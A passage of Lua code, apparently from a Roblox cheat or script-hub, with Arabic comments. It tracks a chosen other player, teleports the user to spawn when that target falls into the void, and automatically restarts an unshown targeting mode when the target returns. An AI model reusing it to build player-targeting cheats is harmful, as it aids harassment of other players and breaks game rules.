        if cachedSpawn then
            return cachedSpawn.CFrame * CFrame.new(0, 5, 0)
        end
        return _AntiVoid.spawnCFrame or CFrame.new(0, 35, 0)
    end

    -- برا الحدود: تحت الفويد، أو فوق (أعلى من maxAltitude)، أو بعيد جداً
    local function isOut(root)
        local p = root.Position
        if p.X ~= p.X or p.Y ~= p.Y or p.Z ~= p.Z then return true end
        local low = -250
        pcall(function()
            local f = workspace.FallenPartsDestroyHeight
            if f == f then low = math.max(f + 35, -250) end
        end)
        local high = math.max(_AntiVoid.maxAltitude or 2200, 1000)
        if p.Y < low or p.Y > high then return true end
        if math.abs(p.X) > 50000 or math.abs(p.Z) > 50000 then return true end
        return false
    end

    local function goToRespawn()
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local hum  = char and char:FindFirstChildOfClass("Humanoid")
        if not root then return end
        local cf = respawnCF()
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.AssemblyLinearVelocity  = Vector3.zero
                part.AssemblyAngularVelocity = Vector3.zero
            end
        end
        root.CFrame = cf
        pcall(function() LocalPlayer:RequestStreamAroundAsync(cf.Position, 2) end)
        if hum then
            pcall(function()
                hum.PlatformStand = false
                hum.Sit = false
                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
            end)
        end
    end

    local function clearState()
        _T18BV.mode = nil
        _T18BV.target = nil
        _T18BV.state = "idle"
        _T18BV.backSince = nil
    end

    local function cancelWaiting()
        local m = _T18BV.mode and MODES[_T18BV.mode]
        if m then
            m.set(false)
            m.paint(false)
        end
        clearState()
    end

    local lastTick = 0
    RunService.Heartbeat:Connect(function()
        local now = tick()
        if now - lastTick < 0.05 then return end
        lastTick = now

        local st = _T18BV
        local m = st.mode and MODES[st.mode]

        if not _AntiVoid.enabled then
            if m and st.state == "waiting" then cancelWaiting() end
            return
        end
        if not m or not st.target then return end

        local tgt = st.target
        if tgt.Parent == nil then
            if st.state == "waiting" then
                showNotification(T18T("المستهدف طلع من السيرفر"))
                cancelWaiting()
            else
                clearState()
            end
            return
        end

        local tChar = tgt.Character
        local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
        local tHum  = tChar and tChar:FindFirstChildOfClass("Humanoid")

        if st.state == "idle" then
            -- الميزة شغالة والمستهدف راح للفويد أو فوق
            if m.on() and tRoot and isOut(tRoot) then
                _auto = true
                pcall(m.stop)
                _auto = false

                st.state = "waiting"
                st.backSince = nil
                -- نخلي الزر يبان شغال عشان لو ضغطته يلغي الانتظار
                m.set(true)
                m.paint(true)

                goToRespawn()
                showNotification(T18T("المستهدف راح للفويد، رجعتك للريسبون"))
            end

        elseif st.state == "waiting" then
            -- تم الايقاف يدوي من زر ثاني
            if not m.on() then
                st.state = "idle"
                st.backSince = nil
                return
            end

            local back = tRoot and tHum and tHum.Health > 0 and not isOut(tRoot)
            if back then
                st.backSince = st.backSince or now
                if now - st.backSince >= 0.4 then
                    st.state = "idle"
                    st.backSince = nil
                    m.set(false)
                    showNotification(T18T("رجع المستهدف، تم التفعيل عليه تلقائي"))
                    task.spawn(function()
                        if tgt.Parent and _t18WaitForTarget(tgt) then
                            m.start(tgt)
                        else
                            m.paint(false)
                            clearState()
                        end
                    end)
                end
            else
                st.backSince = nil
            end
        end
    end)
end)()
